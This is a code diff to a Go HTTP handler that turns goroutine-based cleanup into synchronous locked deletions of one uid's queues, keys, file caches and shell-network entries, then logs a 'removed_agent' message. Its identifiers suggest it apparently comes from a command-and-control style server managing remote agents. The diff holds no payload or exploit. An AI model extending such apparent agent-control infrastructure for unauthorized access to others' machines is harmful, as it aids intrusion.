@@ -546,71 +546,53 @@ func User_index(web_route string)http.HandlerFunc {
                             serverDataMu.Unlock()
                         }
 
-						go func() {
-							keyMu.Lock()
-							delete(key_map, uid)
-							keyMu.Unlock()
-						}()
+						keyMu.Lock()
+						delete(key_map, uid)
+						keyMu.Unlock()
 
-						go func() {
-							uidMutex.Lock()
-							delete(uid_base, uid)
-							uidMutex.Unlock()
-						}()
+						uidMutex.Lock()
+						delete(uid_base, uid)
+						uidMutex.Unlock()
 
-						go func() {
-							queuesMu.Lock()
-							delete(msgQueues, uid)
-							queuesMu.Unlock()
-						}()
+						queuesMu.Lock()
+						delete(msgQueues, uid)
+						queuesMu.Unlock()
 
-						go func() {
-							resultMu.Lock()
-							delete(msgResultQueues, uid)
-							resultMu.Unlock()
-						}()
+						resultMu.Lock()
+						delete(msgResultQueues, uid)
+						resultMu.Unlock()
 
-						go func() {
-							mapMu.Lock()
-							for i := len(msg_map_list) - 1; i >= 0; i-- {
-								if msg_map_list[i].Uid == uid {
-									msg_map_list = append(msg_map_list[:i], msg_map_list[i+1:]...)
-								}
+						mapMu.Lock()
+						for i := len(msg_map_list) - 1; i >= 0; i-- {
+							if msg_map_list[i].Uid == uid {
+								msg_map_list = append(msg_map_list[:i], msg_map_list[i+1:]...)
 							}
-							mapMu.Unlock()
-						}()
+						}
+						mapMu.Unlock()
 
-						go func() {
-							fileMu.Lock()
-							delete(msgFileQueue, uid)
-							fileMu.Unlock()
-						}()
+						fileMu.Lock()
+						delete(msgFileQueue, uid)
+						fileMu.Unlock()
 
-						go func() {
-							fcache.Lock()
-							for i := len(msg_file_cache) - 1; i >= 0; i-- {
-								if msg_file_cache[i].Uid == uid {
-									msg_file_cache = append(msg_file_cache[:i], msg_file_cache[i+1:]...)
-								}
+						fcache.Lock()
+						for i := len(msg_file_cache) - 1; i >= 0; i-- {
+							if msg_file_cache[i].Uid == uid {
+								msg_file_cache = append(msg_file_cache[:i], msg_file_cache[i+1:]...)
 							}
-							fcache.Unlock()
-						}()
+						}
+						fcache.Unlock()
 
-						go func() {
-							netMu.Lock()
-							delete(shell_net_post, uid)
-							netMu.Unlock()
-						}()
+						netMu.Lock()
+						delete(shell_net_post, uid)
+						netMu.Unlock()
 
-						go func() {
-						    dataInnetmu.Lock()
-						    for i := len(data_innet.Innets) - 1; i >= 0; i-- {
-						        if data_innet.Innets[i].Uid == uid {
-						            data_innet.Innets = append(data_innet.Innets[:i], data_innet.Innets[i+1:]...)
-						        }
-						    }
-							dataInnetmu.Unlock()
-						}()
+						dataInnetmu.Lock()
+						for i := len(data_innet.Innets) - 1; i >= 0; i-- {
+							if data_innet.Innets[i].Uid == uid {
+								data_innet.Innets = append(data_innet.Innets[:i], data_innet.Innets[i+1:]...)
+							}
+						}
+						dataInnetmu.Unlock()
 
                         logStr := fmt.Sprintf(log_word["removed_agent"], uid)
                         logger.WriteLog(logStr)
